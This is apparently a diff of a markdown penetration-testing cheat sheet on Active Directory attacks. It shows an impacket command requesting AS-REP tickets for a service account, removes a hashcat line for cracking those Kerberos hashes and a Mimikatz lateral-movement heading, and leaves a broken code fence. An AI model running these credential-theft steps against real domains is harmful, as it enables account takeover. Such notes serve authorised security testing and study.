@@ -271,17 +271,7 @@ Then, use `GetNPUsers` to request ticket
 
 ```bash
 impacket-GetNPUsers domain.local/svc-admin -no-pass
-```
-
-Then, crack the hash
-
-```bash
-hashcat -m 18200 -a 0 hash.kerberos passwordlist.txt
-```
-
-## Lateral movement
-
-### Mimikatz - Cached Credential
+``
 
 Dump the credentials of all logged-on users:
 
